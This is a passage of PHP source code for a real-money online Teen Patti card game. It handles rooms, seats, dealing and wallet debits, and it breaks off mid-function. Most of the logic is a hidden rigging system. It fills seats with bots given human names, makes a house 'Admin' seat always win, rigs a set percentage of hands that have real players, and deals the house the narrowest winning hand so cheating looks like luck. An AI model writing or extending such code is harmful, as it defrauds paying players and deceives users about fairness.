<?php
/**
 * Teen Patti — six-room, four-seat, real-time table game.
 *
 * =================================================================================================
 * FIVE TIMERS BECAME FIVE DEADLINES
 * =================================================================================================
 * server.js drove this game with setTimeout/setInterval:
 *
 *   filler turn scheduler   1.5-3.5s random   ->  TeenPattiRoom.bot_turn_due_at
 *   post-hand room reset    5s                ->  TeenPattiRoom.round_end_due_at
 *   bot fill after a join   15s               ->  TeenPattiRoom.bot_fill_due_at
 *   sweeper (turn timeout,
 *     stuck rooms, presence) every 5s         ->  tp_sweep(), run on every request + the cron
 *   organic traffic engine  6-12s random      ->  GameState `tp_traffic_next_at`, same treatment
 *
 * Each deadline is written down, and whichever request arrives after it has passed performs the
 * work. A room with a player in it advances promptly because the client polls every 2 seconds. An
 * EMPTY room has nothing polling it, which is what the one-minute cron is for: it runs exactly the
 * same sweep, so idle rooms still fill and still start. The only visible difference is that an
 * unwatched lobby fills in minute-granularity steps rather than every 6-12 seconds.
 * =================================================================================================
 */

require_once __DIR__ . '/../lib/db.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/botengine.php';
require_once __DIR__ . '/../lib/rigaudit.php';

const TP_TURN_TIMEOUT   = 15;     // seconds
const TP_BOT_FILL_DELAY = 5000;   // 5s before fillers occupy empty seats
// A bot's per-turn "thinking" delay — close to how long a real player takes to decide (seen the
// cards, chaal vs fold, maybe a sideshow), not an instant reaction. This is the main lever behind a
// hand's pace: with 4 mandatory players and several chaal rounds, every second here is multiplied
// many times over across a hand.
//
// Lowered from 5-10s (and the fill delay from 15s) on operator request — at the old values an
// ordinary hand ran several minutes, which read as the game being stuck rather than deliberate. At
// 2-4s a hand still paces like people deciding rather than machines, but finishes in well under
// half the time. These four constants are the whole speed control: raise them to slow hands down.
const TP_BOT_THINK_MIN  = 2000;
const TP_BOT_THINK_MAX  = 4000;
const TP_ROUND_DELAY    = 3000;   // 3s between rounds

// Last-resort watchdog: a hand whose turn has not moved in this long is not a slow hand, it is a
// stuck one, and the room is returned to 'waiting'. Deliberately far longer than any real hand
// (turns move every 2-4s), so it only ever fires on a genuine deadlock. A room where "Admin" holds
// the turn is exempt in practice without special-casing: the timeout branch below refreshes
// turn_start for Admin on every sweep, which is what gives that seat unlimited time.
const TP_STUCK_ROOM_MS  = 5 * 60 * 1000;

/**
 * Realistic filler names for empty-seat auto-fill — no seat is ever named or labelled "bot"
 * anywhere in the app. The only seat that ever wins on purpose is explicitly renamed to "Admin" at
 * the exact moment the takeover algorithm selects it (see tp_start_round); every other auto-filled
 * seat just gets a plain human-looking name.
 */
function tp_simulated_names() {
    return [
        'Aarav', 'Vivaan', 'Aditya', 'Vihaan', 'Arjun', 'Sai', 'Reyansh', 'Arav', 'Pranav', 'Krishna',
        'Ishaan', 'Shaurya', 'Atharv', 'Rohan', 'Rudra', 'Aryan', 'Dev', 'Karan', 'Dhruv', 'Siddharth',
        'Ananya', 'Diya', 'Ishika', 'Kiara', 'Myra', 'Aria', 'Saanvi', 'Riya', 'Prisha', 'Anika',
    ];
}

function random_filler_name() {
    $names = tp_simulated_names();
    return $names[(int) floor(js_random() * count($names))] . '_' . (10 + (int) floor(js_random() * 90));
}

/**
 * Called by every seat-fill path right before it occupies a seat with an ordinary filler.
 *
 * This used to also decide whether the seat being filled was "Admin" — rooms were pre-selected at
 * toggle time to reserve a random arrival position for the house's own seat, independent of the
 * per-round decision every other rig path draws from. That meant a room could win its "one
 * guaranteed Admin seat" from this mechanism ON TOP OF whatever the per-round engine produced
 * afterwards: two independent percentage mechanisms stacking instead of summing to the one
 * percentage the operator configured, which is exactly why 50% could show up as "8 of 10 games".
 * Every seat filled through here is now always an ordinary filler.
 */
function next_room_filler_username() {
    return ['username' => random_filler_name(), 'is_bot' => true];
}

// -------------------------------------------------------------------------------------------------
// Cards
// -------------------------------------------------------------------------------------------------

function tp_create_deck() {
    $suits = ['S', 'H', 'C', 'D'];
    $deck = [];
    for ($r = 2; $r <= 14; $r++) {
        foreach ($suits as $s) $deck[] = ['r' => $r, 's' => $s];
    }
    return js_shuffle($deck);
}

/** Suit key of a card, tolerating both the raw {r,s} and the formatted {r,suit} shapes. */
function tp_suit_of($card) {
    if (isset($card['s']) && $card['s'] !== null) return $card['s'];
    return $card['suit'] ?? null;
}

/**
 * Evaluate a three-card hand.
 * Returns [category, tiebreak[], bestSuit] where category is
 * 6 Trail, 5 Pure Sequence, 4 Sequence, 3 Colour, 2 Pair, 1 High Card.
 */
function tp_evaluate_hand($cards) {
    if (!is_array($cards) || count($cards) < 3) return [0, [0], 0];

    $ranks = [];
    foreach ($cards as $c) $ranks[] = (int)$c['r'];
    rsort($ranks);

    $suits = [];
    foreach ($cards as $c) $suits[] = tp_suit_of($c);

    $isColor = ($suits[0] === $suits[1] && $suits[1] === $suits[2]);

    $isSeq = false;
    $seqTiebreak = $ranks;
    if ($ranks[0] - $ranks[1] === 1 && $ranks[1] - $ranks[2] === 1) {
        $isSeq = true;
    } elseif ($ranks[0] === 14 && $ranks[1] === 3 && $ranks[2] === 2) {
        // A-3-2 is a sequence but the LOWEST one, hence the synthetic tiebreak.
        $isSeq = true;
        $seqTiebreak = [3, 2, 1];
    }

    $suitVals = ['S' => 4, 'H' => 3, 'C' => 2, 'D' => 1];
    $bestSuit = 0;
    foreach ($suits as $s) {
        $v = $suitVals[$s] ?? 0;
        if ($v > $bestSuit) $bestSuit = $v;
    }

    if ($ranks[0] === $ranks[1] && $ranks[1] === $ranks[2]) return [6, [$ranks[0]], $bestSuit];
    if ($isSeq && $isColor) return [5, $seqTiebreak, $bestSuit];
    if ($isSeq) return [4, $seqTiebreak, $bestSuit];
    if ($isColor) return [3, $ranks, $bestSuit];
    if ($ranks[0] === $ranks[1]) return [2, [$ranks[0], $ranks[2]], $bestSuit];
    if ($ranks[1] === $ranks[2]) return [2, [$ranks[1], $ranks[0]], $bestSuit];
    return [1, $ranks, $bestSuit];
}

/** Does hand $a beat hand $b? */
function tp_hand_wins($a, $b) {
    if ($a[0] !== $b[0]) return $a[0] > $b[0];
    for ($i = 0; $i < count($a[1]); $i++) {
        $av = $a[1][$i] ?? 0;
        $bv = $b[1][$i] ?? 0;
        if ($av !== $bv) return $av > $bv;
    }
    return $a[2] > $b[2];
}

/**
 * Find the closest believable winning hand — the one with the MINIMUM winning margin over the best
 * rival hand.
 *
 * This is what makes a rigged win read as better luck rather than an obviously stacked deck: the
 * house does not get a Trail every time, it gets whatever just barely beats the table.
 */
function tp_find_oblivious_winning_hand($deck, $rivalHand) {
    $bestCards = null;
    $bestEval = null;
    $n = count($deck);

    for ($i = 0; $i < $n - 2; $i++) {
        for ($j = $i + 1; $j < $n - 1; $j++) {
            for ($k = $j + 1; $k < $n; $k++) {
                $cards = [$deck[$i], $deck[$j], $deck[$k]];
                $ev = tp_evaluate_hand($cards);
                if (!tp_hand_wins($ev, $rivalHand)) continue;
                // Keep the WEAKEST hand that still wins.
                if ($bestEval === null || tp_hand_wins($bestEval, $ev)) {
                    $bestEval = $ev;
                    $bestCards = $cards;
                }
            }
        }
    }
    return ['cards' => $bestCards, 'evaluation' => $bestEval];
}

function tp_hand_label($cat) {
    $m = [6 => 'Trail', 5 => 'Pure Sequence', 4 => 'Sequence', 3 => 'Color', 2 => 'Pair', 1 => 'High Card'];
    return $m[$cat] ?? 'Unknown';
}

function tp_rank_label($r) {
    $m = [11 => 'J', 12 => 'Q', 13 => 'K', 14 => 'A'];
    return $m[(int)$r] ?? (string)(int)$r;
}

function tp_suit_symbol($s) {
    $m = ['S' => '♠', 'H' => '♥', 'C' => '♣', 'D' => '♦'];
    return $m[$s] ?? $s;
}

function tp_format_cards($cards) {
    if (!is_array($cards)) return null;
    $out = [];
    foreach ($cards as $c) {
        $suitKey = tp_suit_of($c);
        $out[] = [
            'label'  => tp_rank_label($c['r']),
            'suit'   => $suitKey,
            'symbol' => tp_suit_symbol($suitKey),
            'red'    => ($suitKey === 'H' || $suitKey === 'D'),
            'r'      => (int)$c['r'],
        ];
    }
    return $out;
}

// -------------------------------------------------------------------------------------------------
// Room access
// -------------------------------------------------------------------------------------------------

function tp_room_ids_list() { return tp_room_ids(); }

function tp_get_room($roomId) {
    return one('SELECT * FROM "TeenPattiRoom" WHERE "id" = ?', [$roomId]);
}

function tp_get_seats($roomId) {
    $rows = all('SELECT * FROM "TeenPattiSeat" WHERE "room_id" = ? ORDER BY "seat" ASC', [$roomId]);
    foreach ($rows as $i => $r) {
        $rows[$i]['seat']    = (int)$r['seat'];
        $rows[$i]['is_bot']  = ((int)$r['is_bot']) !== 0;
        $rows[$i]['folded']  = ((int)$r['folded']) !== 0;
        $rows[$i]['seen']    = ((int)$r['seen']) !== 0;
        $rows[$i]['balance'] = (float)$r['balance'];
        $rows[$i]['cards']   = $r['cards'] === null ? null : json_decode($r['cards'], true);
    }
    return $rows;
}

function tp_room_log($room) {
    $log = $room['log'] === null ? [] : json_decode($room['log'], true);
    return is_array($log) ? $log : [];
}

function tp_room_admin_rig($room) {
    if ($room['admin_rig'] === null) return null;
    $r = json_decode($room['admin_rig'], true);
    return is_array($r) ? $r : null;
}

function tp_update_room($roomId, array $fields) {
    if (!count($fields)) return;
    $sets = []; $params = [];
    foreach ($fields as $k => $v) { $sets[] = "\"$k\" = ?"; $params[] = $v; }
    $params[] = $roomId;
    q('UPDATE "TeenPattiRoom" SET ' . implode(', ', $sets) . ' WHERE "id" = ?', $params);
}

function tp_update_seat($seatId, array $fields) {
    if (!count($fields)) return;
    $sets = []; $params = [];
    foreach ($fields as $k => $v) { $sets[] = "\"$k\" = ?"; $params[] = $v; }
    $params[] = (int)$seatId;
    q('UPDATE "TeenPattiSeat" SET ' . implode(', ', $sets) . ' WHERE "id" = ?', $params);
}

function tp_clear_all_seats($roomId) {
    q('UPDATE "TeenPattiSeat" SET "username" = NULL, "is_bot" = 0, "cards" = NULL, "folded" = 0,
       "last_seen_at" = NULL WHERE "room_id" = ?', [$roomId]);
}

function tp_reset_room_to_waiting($roomId) {
    tp_clear_all_seats($roomId);
    tp_update_room($roomId, ['status' => 'waiting', 'pot' => 0, 'winner_seat' => null]);
    tp_apply_room_bot_target($roomId);
}

/**
 * Bring this room's bot-seat count in line with its configured ambient target (see
 * lib/botengine.php) RIGHT NOW, rather than waiting for the next organic traffic tick.
 *
 * Called after a daily shuffle, a manual admin override, and every room reset, which is what
 * guarantees a room is never left looking empty for minutes at a time. Unlike tp_run_bot_fill this
 * acts on a completely empty room too (no players seated yet at all), and it also REMOVES bot
 * seats when the target has been lowered below the room's current bot count. Never touches a room
 * mid-hand — a live 'playing' room is left alone and picks up the current target the next time it
 * resets to 'waiting' on its own.
 */
function tp_apply_room_bot_target($roomId) {
    try {
        if (!cfg('TEENPATTI_AUTO_BOT_FILL')) return;
        $room = tp_get_room($roomId);
        if (!$room || $room['status'] !== 'waiting') return;

        $seats = tp_get_seats($roomId);
        $target = tp_room_bot_target($roomId);
        $botSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && !empty($s['is_bot']); }));
        $botCount = count($botSeats);

        if ($botCount < $target) {
            $empty = array_values(array_filter($seats, function ($s) { return empty($s['username']); }));
            $need = min($target - $botCount, count($empty));
            for ($i = 0; $i < $need; $i++) {
                $filler = next_room_filler_username();
                tp_update_seat($empty[$i]['id'], [
                    'username' => $filler['username'],
                    'is_bot'   => $filler['is_bot'] ? 1 : 0,
                    'folded'   => 0,
                    'balance'  => 1000 + (int) floor(js_random() * 5000),
                ]);
            }
        } elseif ($botCount > $target) {
            $excess = $botCount - $target;
            for ($i = 0; $i < $excess; $i++) {
                tp_update_seat($botSeats[$i]['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0]);
            }
        }

        // Mandatory full table: tp_start_round itself now refuses anything short of 4/4, so a room
        // sitting at 1-3 bots (its target, per the auto/manual allocation above) stays visibly
        // "waiting" rather than dealing itself a hand — real players fill the remaining seats.
        $updatedSeats = tp_get_seats($roomId);
        $occupied = count(array_filter($updatedSeats, function ($s) { return !empty($s['username']); }));
        if ($occupied >= TP_ROOM_SEAT_COUNT) tp_start_round($roomId);
    } catch (Throwable $e) { log_error('[TP] Error applying room bot target: ' . $e->getMessage()); }
}

/**
 * Vacate a stale "Admin" seat.
 *
 * Clearing admin_rig stops any FUTURE round being rigged, but does nothing about "Admin" already
 * sitting in a seat from before the toggle changed — tp_start_round's ADMIN AUTO-WIN check rigs for
 * a seated Admin unconditionally, "however it got seated", so a stale seat kept auto-winning every
 * hand indefinitely even after the operator turned the bot off.
 *
 * A hand already in progress is left alone: the cards are dealt and stakes are committed, so
 * evicting mid-hand would corrupt that round rather than fix anything. The post-round reset already
 * will not reseed Admin once the bot is off, so an in-flight hand self-corrects when it finishes.
 */
function tp_evict_stale_admin_seat($roomId) {
    try {
        $room = tp_get_room($roomId);
        if (!$room || $room['status'] === 'playing') return;
        $count = affected(
            "UPDATE \"TeenPattiSeat\" SET \"username\" = NULL, \"is_bot\" = 0, \"cards\" = NULL, \"folded\" = 0
             WHERE \"room_id\" = ? AND \"username\" = 'Admin'", [$roomId]);
        if ($count > 0) log_info('evicted stale Admin seat after bot takeover toggled off', ['roomId' => $roomId]);
    } catch (Throwable $e) {
        log_error("[TP] Error evicting stale Admin seat in {$roomId}: " . $e->getMessage());
    }
}

// -------------------------------------------------------------------------------------------------
// Filler decision-making
// -------------------------------------------------------------------------------------------------

/**
 * Weighted toward playing on rather than folding early — a hand that resolves by turn 1 or 2 on
 * nearly every weak-hand fold reads as rigged/rushed rather than a natural multi-round Chaal/Blind
 * progression, which is what these odds now favour even on a mediocre hand.
 */
function tp_bot_decide($cards, $stake) {
    $hand = tp_evaluate_hand($cards);
    $cat = $hand[0];
    $rand = js_random() * 100;
    if ($cat >= 5) return 'chaal';
    if ($cat === 4 && $rand <= 92) return 'chaal';
    if ($cat === 3 && $rand <= 82) return 'chaal';
    if ($cat === 2 && $rand <= 68) return 'chaal';
    if ($cat === 1 && $rand <= 45) return 'chaal';
    return 'fold';
}

function tp_next_active_seat($seats, $currentTurnSeat) {
    $nums = [];
    foreach ($seats as $s) {
        if (!empty($s['username']) && empty($s['folded'])) $nums[] = (int)$s['seat'];
    }
    sort($nums);
    if (count($nums) === 0) return null;
    $idx = array_search($currentTurnSeat, $nums, true);
    if ($idx === false) $idx = -1;
    return $nums[($idx + 1) % count($nums)];
}

/** Schedule a filler/Admin turn 1.5-3.5s from now. */
function tp_schedule_bot_turn($roomId) {
    $delay = TP_BOT_THINK_MIN + (int) floor(js_random() * (TP_BOT_THINK_MAX - TP_BOT_THINK_MIN));
    tp_update_room($roomId, ['bot_turn_due_at' => now_ms() + $delay]);
}

/** Schedule the 15s fill-and-deal, unless one is already pending. */
function tp_schedule_bot_fill($roomId) {
    if (!cfg('TEENPATTI_AUTO_BOT_FILL')) return; // real-players-only mode — never pad a table
    $room = tp_get_room($roomId);
    if (!$room) return;
    if ($room['bot_fill_due_at'] !== null) return;   // already scheduled
    tp_update_room($roomId, ['bot_fill_due_at' => now_ms() + TP_BOT_FILL_DELAY]);
}

// -------------------------------------------------------------------------------------------------
// Round lifecycle
// -------------------------------------------------------------------------------------------------

/** Deal a fresh hand. */
/**
 * Deal a new hand, under the table's lock.
 *
 * Several requests call this speculatively (a join, the bot fill, the sweep). Two of them arriving
 * together used to both see a full 'waiting' table and both deal: every real player's boot was
 * taken twice for one hand. Under the lock the second caller sees the hand already dealt
 * ('playing') and does nothing.
 */
function tp_start_round($roomId) {
    return tx_locked('tp_room', $roomId, function () use ($roomId) {
        tp_start_round_locked($roomId);
    });
}

function tp_start_round_locked($roomId) {
    $room = tp_get_room($roomId);
    if (!$room) return;
    if ($room['status'] !== 'waiting') return;   // a hand is already being played, or just finished
    $seats = tp_get_seats($roomId);

    // Mandatory full table: a hand never deals with an empty seat still open. This is the one
    // guard every caller ultimately relies on — tp_apply_room_bot_target, the join handler, and
    // tp_run_bot_fill all still call tp_start_round speculatively, but none of them can make a
    // hand start early because this check refuses anything short of every seat filled.
    $occupiedSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']); }));
    if (count($occupiedSeats) < TP_ROOM_SEAT_COUNT) return;

    $bootAmt = (float)$room['boot_amount'];

    // Verify all real players can cover the boot; eject anyone who cannot.
    foreach ($occupiedSeats as $idx => $seat) {
        if (empty($seat['is_bot']) && !empty($seat['username'])) {
            if (strtolower($seat['username']) === 'admin') {
                $adminUser = one('SELECT * FROM "User" WHERE "username" = ? LIMIT 1', ['Admin']);
                if ($adminUser) {
                    q('UPDATE "User" SET "wallet_balance" = ? WHERE "id" = ?', [5000.0, (int)$adminUser['id']]);
                }
            }
            $user = find_user_ci($seat['username']);
            if (!$user || (float)$user['wallet_balance'] < $bootAmt) {
                tp_update_seat($seat['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0]);
                $occupiedSeats[$idx]['username'] = null;   // mark as empty in memory
            }
        }
    }

    // Mandatory full table again: the boot-affordability ejection above can drop a real player who
    // arrived with enough balance to join but not enough left to cover the boot right now. That
    // must not leave a 3-player hand dealt anyway — cancel and let the room re-fill to 4/4 from
    // scratch, the same as if it had never reached this point.
    $activeOccupied = array_values(array_filter($occupiedSeats, function ($s) { return !empty($s['username']); }));
    if (count($activeOccupied) < TP_ROOM_SEAT_COUNT) {
        tp_reset_room_to_waiting($roomId);
        return;
    }

    // Take every real player's boot BEFORE dealing, each with the conditional debit (balance check
    // and deduction in one statement). This used to be an unconditional "balance - boot" by
    // username: a player who spent their balance elsewhere a moment after the check above was dealt
    // in anyway and went negative, and a failed debit was only logged, so that player played the
    // hand for free. If anyone cannot pay now, everyone already charged is refunded and the hand is
    // not dealt.
    $charged = [];
    foreach ($activeOccupied as $seat) {
        if (!empty($seat['is_bot']) || empty($seat['username'])) continue;
        $payer = find_user_ci($seat['username']);
        $after = $payer ? debit_wallet((int)$payer['id'], $bootAmt) : null;
        if ($after === null) {
            foreach ($charged as $c) credit_wallet($c['id'], $bootAmt);
            tp_update_seat($seat['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0]);
            tp_reset_room_to_waiting($roomId);
            return;
        }
        $charged[] = ['id' => (int)$payer['id'], 'username' => $payer['username']];
    }
    foreach ($charged as $c) {
        insert_transaction(
            new_record_id('TP'), $c['username'], 'Withdrawal', $bootAmt,
            'Teen Patti Boot — ' . $room['name'] . ' Round #' . ((int)$room['round'] + 1),
            'Completed'
        );
    }

    $deck = tp_create_deck();
    $deckPos = 0;
    $pot = 0.0;

    foreach ($activeOccupied as $seat) {
        $cards = [$deck[$deckPos++], $deck[$deckPos++], $deck[$deckPos++]];
        $pot += $bootAmt;

        tp_update_seat($seat['id'], [
            'cards'   => js_json_encode($cards),
            'folded'  => 0,
            // Fillers have effectively infinite funds; for humans this tracks the round delta.
            'balance' => !empty($seat['is_bot']) ? 5000.0 : ($bootAmt * -1),
            'seen'    => !empty($seat['is_bot']) ? 1 : 0,
        ]);
    }

    // ---- Decide whether this hand is rigged -----------------------------------------------------
    $rigSeat = null;
    $rigReason = '';

    $adminSeatEntry = null;
    foreach ($activeOccupied as $s) {
        if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) === 'admin') { $adminSeatEntry = $s; break; }
    }

    $existingRig = tp_room_admin_rig($room);

    if ($adminSeatEntry) {
        // The house's own account always wins whenever it is seated — independent of the manual rig
        // config, the bot on/off state, or live targeting. It still uses the same closest-believable
        // winning-hand construction as every other rig path, so it reads as better luck rather than
        // an obviously stacked deck every single time.
        $rigSeat = (int)$adminSeatEntry['seat'];
        $rigReason = 'ADMIN AUTO-WIN';
        try {
            tp_update_room($roomId, ['admin_rig' => js_json_encode(['winner_seat' => $rigSeat, 'is_admin_autowin' => true])]);
        } catch (Throwable $e) { log_error('[TP] Error persisting admin auto-win rig: ' . $e->getMessage()); }
    } elseif ($existingRig !== null && array_key_exists('winner_seat', $existingRig)) {
        $rigSeat = (int)$existingRig['winner_seat'];
        $rigReason = 'MANUAL ADMIN RIG';
    } else {
        // Every table draws from its OWN exact 100-slot ledger, the same way each colour room does.
        //
        // The previous approach picked a live subset of TABLES and rigged whichever hands those
        // tables dealt. That satisfied "50% of live tables are the house's" at any instant but
        // produced the wrong experience: the selection was sticky, so the first table to go live
        // captured the slot and never released it, and with uneven table activity the share of HANDS
        // rigged bore no relation to the configured figure. Measured with 23 players across six
        // tables at 50%: one table took the entire share while every other got nothing, for 11% of
        // hands overall. A per-table ledger satisfies both readings at once.
        //
        // Only tables with a real person on them draw at all: rigging a table occupied purely by
        // NPCs moves no money and would burn slots that belong to real hands.
        $bot = bot_takeover_active('teenpatti');

        $hasRealPlayer = false;
        foreach ($activeOccupied as $s) {
            if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) !== 'admin') { $hasRealPlayer = true; break; }
        }
        if ($hasRealPlayer) mark_instance_active('teenpatti', $roomId);

        $tableDecision = $hasRealPlayer
            ? should_bot_rig_this_round('teenpatti', 'teenpatti:' . $roomId)
            : ['shouldRig' => false, 'profit_pct' => $bot['profit_pct'], 'active' => $bot['active']];

        if ($tableDecision['shouldRig']) {
            $botSeat = null;
            foreach ($activeOccupied as $s) { if (!empty($s['is_bot'])) { $botSeat = $s; break; } }
            $targetSeat = $botSeat;

            if ($targetSeat === null) {
                // No filler bot is sitting at this table (production runs with none by design — see
                // TEENPATTI_AUTO_BOT_FILL) — the only honest way for the house to take a cut is to
                // occupy a seat itself, staking a real boot like anyone else. Falling back to a REAL
                // player's own seat here moves no money at all: it just relabels which already-seated
                // player wins their own shared pot back, silently zeroing out the house edge on any
                // table that fills with real players. If there's nowhere left to sit, this hand is
                // simply left unrigged below — the house never staked anything in it.
                $activeSeatNumbers = array_map(function ($s) { return (int)$s['seat']; }, $activeOccupied);
                $emptySeat = null;
                foreach ($seats as $s) {
                    if (!in_array((int)$s['seat'], $activeSeatNumbers, true)) { $emptySeat = $s; break; }
                }
                if ($emptySeat !== null) {
                    try {
                        $adminUser = get_or_create_user('Admin');
                        if ($adminUser) {
                            q('UPDATE "User" SET "wallet_balance" = ? WHERE "id" = ?', [5000.0, (int)$adminUser['id']]);
                        }
                        $cards = [$deck[$deckPos++], $deck[$deckPos++], $deck[$deckPos++]];
                        tp_update_seat($emptySeat['id'], [
                            'username' => 'Admin', 'is_bot' => 0, 'cards' => js_json_encode($cards),
                            'folded' => 0, 'balance' => $bootAmt * -1, 'seen' => 0,
                        ]);
                        q('UPDATE "User" SET "wallet_balance" = "wallet_balance" - ? WHERE "username" = ?', [$bootAmt, 'Admin']);
                        insert_transaction(
                            new_record_id('TP'), 'Admin', 'Withdrawal', $bootAmt,
                            'Teen Patti Boot — ' . $room['name'] . ' Round #' . ((int)$room['round'] + 1),
                            'Completed'
                        );
                        $pot += $bootAmt;
                        $emptySeat['username'] = 'Admin';
                        $emptySeat['is_bot'] = 0;
                        $occupiedSeats[] = $emptySeat; // keep firstSeat's candidate list consistent, below
                        $targetSeat = $emptySeat;
                    } catch (Throwable $e) { log_error('[TP] Error seating Admin for bot-takeover rig: ' . $e->getMessage()); }
                }
            }

            if ($targetSeat) {
                $rigSeat = (int)$targetSeat['seat'];
                $rigReason = "AI BOT TAKEOVER (" . js_num_str($bot['profit_pct']) . "% OF THIS TABLE'S HANDS)";
                // Whenever the algorithm's own pick is a genuine filler seat — never a real
                // connected human it fell back to — rename it to "Admin" for this hand.
                if ($botSeat !== null) {
                    try {
                        tp_update_seat($botSeat['id'], ['username' => 'Admin', 'is_bot' => 0]);
                    } catch (Throwable $e) { log_error('[TP] Error renaming targeted seat to Admin: ' . $e->getMessage()); }
                }
                try {
                    tp_update_room($roomId, ['admin_rig' => js_json_encode([
                        'winner_seat' => $rigSeat, 'is_bot_rig' => true, 'profit_pct' => $bot['profit_pct'],
                    ])]);
                } catch (Throwable $e) { log_error('[TP] Error persisting bot rig: ' . $e->getMessage()); }
            }
        }
    }

    // Audit only — one entry per hand, tagged with the room so the per-table split is visible.
    $eligible = false;
    foreach ($activeOccupied as $s) {
        if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) !== 'admin') { $eligible = true; break; }
    }
    rig_record([
        'game'           => 'teenpatti',
        'instance'       => $roomId,
        'round'          => (int)$room['round'] + 1,
        'configured_pct' => bot_takeover_active('teenpatti')['profit_pct'],
        'rigged'         => $rigSeat !== null,
        // A hand between NPCs never draws from the table's ledger, so it is recorded for visibility
        // but excluded from the ratio — counting it would understate how often real hands are rigged.
        'eligible'       => $eligible,
        // Reported for context only: each table decides from its own ledger, so this is not the
        // decision's denominator.
        'live'           => count(get_live_instances('teenpatti')),
        'note'           => $rigReason !== '' ? $rigReason : 'fair hand',
    ]);

    // ---- Apply the rig: construct the closest believable winning hand ---------------------------
    if ($rigSeat !== null) {
        $freshSeats = tp_get_seats($roomId);
        $activeSeats = array_values(array_filter($freshSeats, function ($s) { return !empty($s['username']) && !empty($s['cards']); }));
        if (count($activeSeats) >= 2) {
            $rivalSeats = array_values(array_filter($activeSeats, function ($s) use ($rigSeat) { return (int)$s['seat'] !== $rigSeat; }));
            if (count($rivalSeats) > 0) {
                $bestRivalSeat = $rivalSeats[0];
                for ($i = 1; $i < count($rivalSeats); $i++) {
                    if (tp_hand_wins(tp_evaluate_hand($rivalSeats[$i]['cards']), tp_evaluate_hand($bestRivalSeat['cards']))) {
                        $bestRivalSeat = $rivalSeats[$i];
                    }
                }
                $rivalBestHand = tp_evaluate_hand($bestRivalSeat['cards']);

                $rigTarget = null;
                foreach ($activeSeats as $s) { if ((int)$s['seat'] === $rigSeat) { $rigTarget = $s; break; } }

                if ($rigTarget) {
                    $usedCardKeys = [];
                    foreach ($rivalSeats as $s) {
                        if (!empty($s['cards'])) {
                            foreach ($s['cards'] as $c) $usedCardKeys[$c['r'] . '_' . tp_suit_of($c)] = true;
                        }
                    }
                    $fullDeck = tp_create_deck();
                    $remainingDeck = array_values(array_filter($fullDeck, function ($c) use ($usedCardKeys) {
                        return !isset($usedCardKeys[$c['r'] . '_' . $c['s']]);
                    }));
                    $oblivious = tp_find_oblivious_winning_hand($remainingDeck, $rivalBestHand);

                    if ($oblivious && $oblivious['cards']) {
                        tp_update_seat($rigTarget['id'], ['cards' => js_json_encode(tp_format_cards($oblivious['cards']))]);
                    } else {
                        // Fallback swap: give the target the best rival's hand and vice versa.
                        $tempCards = $rigTarget['cards'];
                        tp_update_seat($rigTarget['id'],     ['cards' => js_json_encode($bestRivalSeat['cards'])]);
                        tp_update_seat($bestRivalSeat['id'], ['cards' => js_json_encode($tempCards)]);
                    }
                }
            }
        }
    }

    // NOTE: firstSeat is taken from occupiedSeats, which still contains any seat vacated for
    // insufficient balance above. So the first turn can land on a now-empty seat. That is the
    // original behaviour and is reproduced; the turn-timeout sweep moves play on if it happens.
    $sorted = $occupiedSeats;
    usort($sorted, function ($a, $b) { return $a['seat'] - $b['seat']; });
    $firstSeat = (int)$sorted[0]['seat'];

    tp_update_room($roomId, [
        'status'        => 'playing',
        'pot'           => $pot,
        'current_stake' => $bootAmt,
        'turn_seat'     => $firstSeat,
        'turn_index'    => 0,
        'turn_start'    => ms_to_sql(),
        'winner_seat'   => null,
        'round'         => (int)$room['round'] + 1,
        'deck_state'    => js_json_encode(array_slice($deck, $deckPos, 10)),
        'log'           => js_json_encode(['Round #' . ((int)$room['round'] + 1) . ' started! Boot: ₹' . js_num_str($bootAmt) . '. Pot: ₹' . js_num_str($pot)]),
        'bot_fill_due_at'  => null,
        'round_end_due_at' => null,
    ]);

    // If the first seat is a filler (or Admin), schedule its move.
    $firstPlayer = null;
    foreach ($occupiedSeats as $s) { if ((int)$s['seat'] === $firstSeat) { $firstPlayer = $s; break; } }
    // The original dereferenced `firstPlayer.username.toLowerCase()` here, which throws when the
    // first seat is one that was just vacated. Guarded rather than reproduced, because a crash is
    // not a behaviour anything depends on; the observable outcome (no bot turn scheduled for an
    // empty seat) is what the sweep then handles.
    if ($firstPlayer && (!empty($firstPlayer['is_bot']) ||
        (!empty($firstPlayer['username']) && strtolower($firstPlayer['username']) === 'admin'))) {
        tp_schedule_bot_turn($roomId);
    }
}

/**
 * Process one player (or filler) action, under the table's lock. Returns the same result objects
 * the original returned.
 *
 * Without the lock, the same action sent several times at once was processed several times: every
 * copy read "your turn" before any of them moved the turn on. Pressing Show five times in parallel
 * paid the whole pot five times.
 */
function tp_process_action($roomId, $username, $action) {
    return tx_locked('tp_room', $roomId, function () use ($roomId, $username, $action) {
        return tp_process_action_locked($roomId, $username, $action);
    });
}

function tp_process_action_locked($roomId, $username, $action) {
    $room = tp_get_room($roomId);
    if (!$room || $room['status'] !== 'playing') return ['error' => 'Game not active.'];
    $seats = tp_get_seats($roomId);

    $mySeat = null;
    foreach ($seats as $s) {
        if (!empty($s['username']) && strtolower($s['username']) === strtolower((string)$username)) { $mySeat = $s; break; }
    }
    if (!$mySeat) return ['error' => 'You are not in this room.'];
    if (!empty($mySeat['folded'])) return ['error' => 'You already folded.'];
    if ((int)$room['turn_seat'] !== (int)$mySeat['seat']) return ['error' => 'Not your turn.'];

    $activeSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));
    $log = tp_room_log($room);
    $currentStake = (float)$room['current_stake'];

    if ($action === 'chaal') {
        if (empty($mySeat['is_bot'])) {
            $user = find_user_ci($username);
            // Conditional debit: the balance check and the deduction are one statement.
            if (!$user || debit_wallet((int)$user['id'], $currentStake) === null) {
                return ['error' => 'Insufficient balance for Chaal.'];
            }
            insert_transaction(new_record_id('TP_CHAAL'), $username, 'Withdrawal', $currentStake,
                'Teen Patti Chaal — ' . $room['name'], 'Completed');
        }

        $newPot = (float)$room['pot'] + $currentStake;
